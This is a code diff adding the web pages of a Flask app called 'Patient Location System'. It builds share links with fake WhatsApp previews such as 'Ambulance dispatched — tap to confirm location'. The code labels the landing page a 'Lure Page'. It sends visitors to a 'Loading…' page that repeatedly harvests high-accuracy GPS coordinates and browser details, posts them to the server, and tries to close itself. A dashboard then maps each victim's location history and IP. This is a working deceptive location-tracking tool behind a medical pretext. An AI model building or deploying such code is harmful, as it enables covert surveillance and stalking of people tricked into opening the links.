+.file-name{font-size:12px;color:var(--green);margin-top:8px;display:none;}
+.modal-actions{display:flex;gap:10px;margin-top:26px;}
+.modal-actions button{flex:1;padding:12px;border-radius:8px;
+  font-size:14px;font-weight:600;cursor:pointer;border:none;transition:.15s;}
+.btn-submit{background:var(--accent);color:#fff;}
+.btn-submit:hover{background:#2563eb;}
+.btn-submit:disabled{opacity:.5;cursor:not-allowed;}
+.btn-cancel{background:transparent;border:1px solid var(--border);color:var(--muted);}
+.btn-cancel:hover{border-color:var(--muted);}
+.toast{position:fixed;bottom:24px;right:24px;background:var(--surface);
+  border:1px solid var(--green);border-radius:12px;padding:18px 20px;
+  max-width:420px;display:none;z-index:200;box-shadow:0 10px 40px rgba(0,0,0,.5);}
+.toast.show{display:block;animation:slideUp .25s ease;}
+@keyframes slideUp{from{transform:translateY(14px);opacity:0}to{transform:translateY(0);opacity:1}}
+.toast-close{position:absolute;top:10px;right:12px;background:none;
+  border:none;color:var(--muted);font-size:16px;cursor:pointer;}
+.toast .t-title{font-size:11px;color:var(--green);font-weight:700;
+  text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px;}
+.toast .t-url{font-size:12px;word-break:break-all;color:#93c5fd;
+  background:#0a1323;padding:8px 10px;border-radius:6px;margin-bottom:10px;}
+.toast .t-btns{display:flex;gap:8px;}
+.toast .t-btns button{flex:1;padding:8px;border-radius:7px;
+  font-size:12px;font-weight:600;cursor:pointer;border:none;transition:.15s;}
+.t-copy{background:var(--accent);color:#fff;}
+.t-copy:hover{background:#2563eb;}
+.t-open{background:transparent;border:1px solid var(--border);color:var(--muted);}
+.t-open:hover{border-color:var(--accent);color:var(--accent);}
+@media(max-width:600px){.stats{grid-template-columns:1fr 1fr;}}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="logo">
+    <div class="pulse"></div>
+    Patient Location System
+  </div>
+  <div class="topbar-right" id="last-refresh">—</div>
+</div>
+<div class="main">
+  <div class="stats">
+    <div class="stat"><div class="n" id="s-total">–</div><div class="l">Total Patients</div></div>
+    <div class="stat"><div class="n green" id="s-located">–</div><div class="l">Located</div></div>
+    <div class="stat"><div class="n" id="s-updates">–</div><div class="l">GPS Updates</div></div>
+  </div>
+  <div class="sec-head">
+    <h2>Patient Links</h2>
+    <button class="btn btn-primary" onclick="openModal()">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"
+           stroke="currentColor" stroke-width="2.5">
+        <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
+      </svg>
+      Generate Patient Link
+    </button>
+  </div>
+  <div class="table-wrap">
+    <table>
+      <thead><tr>
+        <th>Patient ID</th><th>Created</th><th>Shareable Link</th>
+        <th>GPS Hits</th><th>Last Location</th><th>Actions</th>
+      </tr></thead>
+      <tbody id="tbody">
+        <tr><td colspan="6" style="padding:0;">
+          <div class="empty"><div class="ico">📍</div>
+          <p>No patients yet — click <strong>Generate Patient Link</strong> to start</p>
+          </div></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Modal -->
+<div class="overlay" id="modal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal()">✕</button>
+    <h3>🔗 Generate Patient Link</h3>
+    <label class="field">Patient ID / Name</label>
+    <input type="text" id="patient-id" placeholder="e.g. PT-001, Ahmed Khan..."
+           autocomplete="off" onkeydown="if(event.key==='Enter')document.getElementById('og-title').focus()">
+    <label class="field">WhatsApp Preview Message</label>
+    <input type="text" id="og-title" placeholder="e.g. Ambulance dispatched — tap to confirm location"
+           autocomplete="off" onkeydown="if(event.key==='Enter')document.getElementById('file-input').click()">
+    <label class="field">Instruction Image</label>
+    <div class="drop-zone" id="drop-zone"
+         onclick="document.getElementById('file-input').click()"
+         ondragover="dzOver(event)" ondragleave="dzLeave()" ondrop="dzDrop(event)">
+      <div class="dz-icon">🖼️</div>
+      <div class="dz-txt">Click to upload or drag &amp; drop<br>
+        <small>PNG · JPG · WEBP — max 20 MB</small></div>
+      <input type="file" id="file-input" accept="image/*" onchange="onFile(this.files[0])">
+    </div>
+    <div class="file-name" id="file-name"></div>
+    <img id="preview-img" alt="Preview">
+    <div class="modal-actions">
+      <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+      <button class="btn-submit" id="submit-btn" onclick="submitCreate()">Generate Link</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast">
+  <button class="toast-close" onclick="closeToast()">✕</button>
+  <div class="t-title">✅ Patient Link Created</div>
+  <div class="t-url" id="toast-url"></div>
+  <div class="t-btns">
+    <button class="t-copy" onclick="copyToast()">📋 Copy Link</button>
+    <button class="t-open"
+      onclick="window.open(document.getElementById('toast-url').textContent,'_blank')">
+      🔗 Preview
+    </button>
+  </div>
+</div>
+
+<script>
+var selectedFile = null;
+function openModal() {
+  document.getElementById('modal').classList.add('open');
+  setTimeout(function(){ document.getElementById('patient-id').focus(); }, 100);
+}
+function closeModal() {
+  document.getElementById('modal').classList.remove('open');
+  selectedFile = null;
+  document.getElementById('file-input').value = '';
+  document.getElementById('patient-id').value = '';
+  document.getElementById('og-title').value = '';
+  document.getElementById('preview-img').style.display = 'none';
+  document.getElementById('file-name').style.display = 'none';
+}
+function dzOver(e) { e.preventDefault(); document.getElementById('drop-zone').classList.add('over'); }
+function dzLeave()  { document.getElementById('drop-zone').classList.remove('over'); }
+function dzDrop(e)  {
+  e.preventDefault(); dzLeave();
+  var f = e.dataTransfer.files[0];
+  if (f && f.type.startsWith('image/')) onFile(f);
+}
+function onFile(f) {
+  if (!f) return;
+  selectedFile = f;
+  document.getElementById('file-name').textContent = '✓ ' + f.name;
+  document.getElementById('file-name').style.display = 'block';
+  var reader = new FileReader();
+  reader.onload = function(ev) {
+    var img = document.getElementById('preview-img');
+    img.src = ev.target.result;
+    img.style.display = 'block';
+  };
+  reader.readAsDataURL(f);
+}
+async function submitCreate() {
+  var pid = document.getElementById('patient-id').value.trim();
+  if (!pid)          { alert('Please enter a Patient ID'); return; }
+  if (!selectedFile) { alert('Please upload an instruction image'); return; }
+  var btn = document.getElementById('submit-btn');
+  btn.textContent = 'Creating…'; btn.disabled = true;
+  var fd = new FormData();
+  fd.append('patient_id', pid);
+  fd.append('photo', selectedFile);
+  fd.append('og_title', document.getElementById('og-title').value.trim());
+  try {
+    var res = await fetch('/create', { method: 'POST', body: fd });
+    var data = await res.json();
+    if (data.error) { alert('Error: ' + data.error); return; }
+    closeModal();
+    document.getElementById('toast-url').textContent = data.link;
+    document.getElementById('toast').classList.add('show');
+    loadLinks();
+  } catch(e) {
+    alert('Network error — please try again');
+  } finally {
+    btn.textContent = 'Generate Link'; btn.disabled = false;
+  }
+}
+function closeToast() { document.getElementById('toast').classList.remove('show'); }
+function copyToast() {
+  var txt = document.getElementById('toast-url').textContent;
+  navigator.clipboard.writeText(txt).then(function() {
+    var b = document.querySelector('.t-copy');
+    b.textContent = '✓ Copied!';
+    setTimeout(function(){ b.textContent = '📋 Copy Link'; }, 2000);
+  });
+}
+function copyUrl(btn, url) {
+  navigator.clipboard.writeText(url).then(function() {
+    btn.textContent = '✓';
+    setTimeout(function(){ btn.textContent = 'Copy'; }, 2000);
+  });
+}
+function timeAgo(iso) {
+  var s = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (s < 60)    return s + 's ago';
+  if (s < 3600)  return Math.floor(s/60) + 'm ago';
+  if (s < 86400) return Math.floor(s/3600) + 'h ago';
+  return Math.floor(s/86400) + 'd ago';
+}
+function loadLinks() {
+  fetch('/links').then(function(r){ return r.json(); }).then(function(data) {
+    var links = data.links;
+    var located = links.filter(function(l){ return l.has_location; }).length;
+    var updates = links.reduce(function(a,l){ return a + l.gps_count; }, 0);
+    document.getElementById('s-total').textContent   = links.length;
+    document.getElementById('s-located').textContent = located;
+    document.getElementById('s-updates').textContent = updates;
+    document.getElementById('last-refresh').textContent =
+      'Refreshed ' + new Date().toLocaleTimeString();
+    if (!links.length) {
+      document.getElementById('tbody').innerHTML =
+        '<tr><td colspan="6" style="padding:0;"><div class="empty">' +
+        '<div class="ico">📍</div>' +
+        '<p>No patients yet — click <strong>Generate Patient Link</strong> to start</p>' +
+        '</div></td></tr>';
+      return;
+    }
+    var origin = window.location.origin;
+    var html = '';
+    links.forEach(function(l) {
+      var shareUrl = origin + '/p/' + l.id;
+      var locHtml;
+      if (l.last_lat !== null) {
+        var mapUrl = 'https://www.google.com/maps?q=' + l.last_lat + ',' + l.last_lng;
+        locHtml  = '<a class="map-link" href="' + mapUrl + '" target="_blank">';
+        locHtml += '📍 ' + l.last_lat.toFixed(5) + ', ' + l.last_lng.toFixed(5) + '</a>';
+        if (l.last_acc) {
+          locHtml += '<br><small style="color:var(--muted)">±' +
+                     Math.round(l.last_acc) + 'm · ' + timeAgo(l.last_seen) + '</small>';
+        }
+      } else {
+        locHtml = '<span class="badge badge-gray">Awaiting</span>';
+      }
+      var badge = l.gps_count > 0
+        ? '<span class="badge badge-green">' + l.gps_count + ' fixes</span>'
+        : '<span class="badge badge-gray">0</span>';
+      html += '<tr>';
+      html += '<td><strong>' + escHtml(l.patient_id) + '</strong></td>';
+      html += '<td style="color:var(--muted);font-size:12px;">' + timeAgo(l.created) + '</td>';
+      html += '<td><div class="url-cell"><code>' + escHtml(shareUrl) + '</code>' +
+              '<button class="btn-copy" onclick="copyUrl(this,\'' + escHtml(shareUrl) + '\')">' +
+              'Copy</button></div></td>';
+      html += '<td>' + badge + '</td>';
+      html += '<td>' + locHtml + '</td>';
+      html += '<td><a href="/results/' + l.id + '" class="btn btn-ghost btn-sm" ' +
+              'style="text-decoration:none;">Details</a></td>';
+      html += '</tr>';
+    });
+    document.getElementById('tbody').innerHTML = html;
+  }).catch(function() {});
+}
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')
+                  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+document.getElementById('modal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+loadLinks();
+setInterval(loadLinks, 5000);
+</script>
+</body>
+</html>"""
+
+
+# ─── Lure Page ────────────────────────────────────────────────────────────────
+LURE_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>{{ og_title }}</title>
+<meta property="og:title" content="{{ og_title }}" />
+<meta property="og:image" content="https://bmw.pythonanywhere.com/img/{{ link_id }}" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://bmw.pythonanywhere.com/img/{{ link_id }}" />
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html, body { width:100%; height:100%; background:#000; overflow:hidden; }
+  .wrap { width:100%; height:100vh; display:flex; align-items:center; justify-content:center; }
+  a { display:flex; width:100%; height:100%; align-items:center; justify-content:center; }
+  img { max-width:100%; max-height:100vh; object-fit:contain; cursor:pointer; display:block;
+        -webkit-tap-highlight-color:transparent; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <a href="/l/{{ link_id }}" id="link">
+    <img src="{{ img_data }}" alt="" draggable="false">
+  </a>
+</div>
+</body>
+</html>"""
+
+
+# ─── Locator Page ─────────────────────────────────────────────────────────────
+LOCATOR_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Loading…</title>
+<style>
+  * { margin:0; padding:0; }
+  body { background:#fff; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  #loader { display:flex; flex-direction:column; align-items:center; gap:18px;
+    font-family:system-ui,sans-serif; color:#94a3b8; }
+  .spinner { width:40px; height:40px; border:3px solid #e2e8f0; border-top-color:#3b82f6;
+    border-radius:50%; animation:spin 1s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  #loader p { font-size:14px; }
+</style>
+</head>
+<body>
+<div id="loader">
+  <div class="spinner"></div>
+  <p>Loading…</p>
+</div>
+<script>
+(function () {
+  var LINK_ID  = "{{ link_id }}";
+  var firstDone = false;
+  var intervalId = null;
+
+  function post(lat, lng, acc, err) {
+    var payload = {
+      link_id    : LINK_ID,
+      latitude   : lat,
+      longitude  : lng,
+      accuracy   : acc,
+      error      : err,
+      user_agent : navigator.userAgent,
+      ts         : new Date().toISOString()
+    };
+    try {
+      fetch('/capture', {
+        method  : 'POST',
+        headers : { 'Content-Type': 'application/json' },
+        body    : JSON.stringify(payload),
+        keepalive: true
+      }).then(function () {
+        if (!firstDone && lat !== null) {
+          firstDone = true;
+          hideAndClose();
+        }
+      }).catch(function () {});
+    } catch (e) {}
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/capture', true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.send(JSON.stringify(payload));
+    } catch (e) {}
+  }
+
+  function hideAndClose() {
+    try { document.getElementById('loader').style.display = 'none'; } catch(e) {}
+    try { document.body.style.background = '#fff'; } catch(e) {}
+    setTimeout(function () {
+      try { window.close(); } catch(e) {}
+    }, 600);
+  }
+
+  function grab() {
+    if (!navigator.geolocation) {
+      post(null, null, null, 'geolocation not supported');
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null); },
+      function (e) {
+        var msgs = ['', 'permission denied', 'position unavailable', 'timeout'];
+        post(null, null, null, msgs[e.code] || e.message || 'unknown error');
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.watchPosition(
+      function (p) { post(p.coords.latitude, p.coords.longitude, p.coords.accuracy, null); },
+      function () {},
+      { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+    );
+  }
+
+  grab();
+  intervalId = setInterval(grab, 10000);
+
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden) grab();
+  });
+  window.addEventListener('beforeunload', function () {
+    grab();
+    if (intervalId) clearInterval(intervalId);
+  });
+})();
+</script>
+</body>
+</html>"""
+
+
+# ─── Results Page ─────────────────────────────────────────────────────────────
+RESULTS_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Results — {{ link.patient_id }}</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+:root{--bg:#0b1120;--surface:#111827;--border:#1e2d45;
+  --accent:#3b82f6;--green:#10b981;--text:#e2e8f0;--muted:#64748b;--danger:#ef4444;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);}
+.topbar{background:var(--surface);border-bottom:1px solid var(--border);
+  padding:0 28px;height:60px;display:flex;align-items:center;gap:16px;}
+.topbar a{color:var(--muted);text-decoration:none;font-size:13px;}
+.topbar a:hover{color:var(--text);}
+.topbar h1{font-size:16px;font-weight:700;}
+.main{max-width:1100px;margin:0 auto;padding:30px 20px;}
+.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+  gap:12px;margin-bottom:28px;}
+.info-card{background:var(--surface);border:1px solid var(--border);
+  border-radius:10px;padding:18px 20px;}
+.info-card .n{font-size:28px;font-weight:700;color:var(--accent);}
+.info-card .n.green{color:var(--green);}
+.info-card .l{font-size:11px;color:var(--muted);margin-top:4px;
+  text-transform:uppercase;letter-spacing:.5px;}
+#map{height:380px;border-radius:10px;margin-bottom:26px;
+  border:1px solid var(--border);background:#111;}
+.section-title{font-size:14px;font-weight:600;color:var(--text);margin-bottom:12px;}
+.table-wrap{background:var(--surface);border:1px solid var(--border);
+  border-radius:10px;overflow:hidden;}
+table{width:100%;border-collapse:collapse;}
+th{background:#0a1323;color:var(--muted);font-size:11px;font-weight:600;
+  text-transform:uppercase;letter-spacing:.5px;padding:10px 14px;text-align:left;
+  border-bottom:1px solid var(--border);}
+td{padding:11px 14px;font-size:12px;border-bottom:1px solid #151f30;vertical-align:middle;}
+tr:last-child td{border-bottom:none;}
+.success{color:var(--green);}
+.fail{color:var(--danger);}
+a.map-link{color:var(--green);text-decoration:none;font-size:12px;}
+a.map-link:hover{text-decoration:underline;}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <a href="/">← Dashboard</a>
+  <h1>Patient: {{ link.patient_id }}</h1>
+</div>
+<div class="main">
+  {% set gps_fixes = captures | selectattr('latitude') | list %}
+  <div class="info-grid">
+    <div class="info-card"><div class="n">{{ captures | length }}</div><div class="l">Total Reports</div></div>
+    <div class="info-card"><div class="n green">{{ gps_fixes | length }}</div><div class="l">GPS Fixes</div></div>
+    <div class="info-card">
+      <div class="n" style="font-size:14px;margin-top:4px;">{{ link.created[:19].replace('T',' ') }} UTC</div>
+      <div class="l">Link Created</div>
+    </div>
+    <div class="info-card">
+      <div class="n" style="font-size:14px;margin-top:4px;">{{ link.id }}</div>
+      <div class="l">Link ID</div>
+    </div>
+  </div>
+  <div class="section-title">📍 Location Map</div>
+  <div id="map"></div>
+  <div class="section-title">GPS History ({{ captures | length }} records)</div>
+  <div class="table-wrap">
+    <table>
+      <thead><tr>
+        <th>#</th><th>Timestamp (UTC)</th><th>Coordinates</th>
+        <th>Accuracy</th><th>IP</th><th>Status</th><th>Map</th>
+      </tr></thead>
+      <tbody>
+        {% for c in captures %}
+        <tr>
+          <td style="color:var(--muted);">{{ loop.index }}</td>
+          <td>{{ c.captured_at[:19].replace('T',' ') }}</td>
+          {% if c.latitude %}
+          <td class="success">{{ '%.5f'|format(c.latitude) }}, {{ '%.5f'|format(c.longitude) }}</td>
+          <td>±{{ (c.accuracy or 0)|int }}m</td>
+          {% else %}
+          <td class="fail">—</td><td>—</td>
+          {% endif %}
+          <td style="color:var(--muted);font-size:11px;">{{ c.ip or '—' }}</td>
+          {% if c.latitude %}
+          <td class="success">✓ Located</td>
+          {% elif c.error_msg %}
+          <td class="fail">✗ {{ c.error_msg }}</td>
+          {% else %}
+          <td style="color:var(--muted);">Pending</td>
+          {% endif %}
+          <td>
+            {% if c.latitude %}
+            <a class="map-link" href="https://www.google.com/maps?q={{ c.latitude }},{{ c.longitude }}" target="_blank">Open ↗</a>
+            {% else %}—{% endif %}
+          </td>
+        </tr>
+        {% else %}
+        <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:30px;">No GPS data yet</td></tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+</div>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+var captures = {{ captures_json | safe }};
+var validFixes = captures.filter(function(c){ return c.lat !== null; });
+if (validFixes.length > 0) {
+  var map = L.map('map');
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
+  var redIcon = L.icon({
+    iconUrl:'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
+    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
+    iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]
+  });
+  var blueIcon = L.icon({
+    iconUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
+    shadowUrl:'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
+    iconSize:[25,41],iconAnchor:[12,41],popupAnchor:[1,-34]
+  });
+  if (validFixes.length > 1) {
+    L.polyline(validFixes.map(function(c){return[c.lat,c.lng];}),{color:'#3b82f6',weight:2,opacity:.6}).addTo(map);
+  }
+  validFixes.forEach(function(c,i){
+    var isLatest=(i===0);
+    var marker=L.marker([c.lat,c.lng],{icon:isLatest?redIcon:blueIcon}).addTo(map);
+    marker.bindPopup('<b>'+(isLatest?'🔴 Latest Fix':'Fix #'+(i+1))+'</b><br>'+
+      c.lat.toFixed(5)+', '+c.lng.toFixed(5)+'<br>±'+Math.round(c.acc||0)+'m<br>'+
+      '<small>'+c.ts.replace('T',' ').slice(0,19)+' UTC</small>');
+    if(isLatest)marker.openPopup();
+  });
+  map.fitBounds(validFixes.map(function(c){return[c.lat,c.lng];}),{padding:[40,40],maxZoom:16});
+} else {
+  document.getElementById('map').innerHTML=
+    '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#64748b;font-family:system-ui;font-size:14px;">📍 No GPS data to display yet</div>';
+}
+setTimeout(function(){window.location.reload();},10000);
+</script>
+</body>
+</html>"""
+
+
+# ─── Startup ──────────────────────────────────────────────────────────────────
+
+init_db()
 
 if __name__ == "__main__":
-    main()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False)
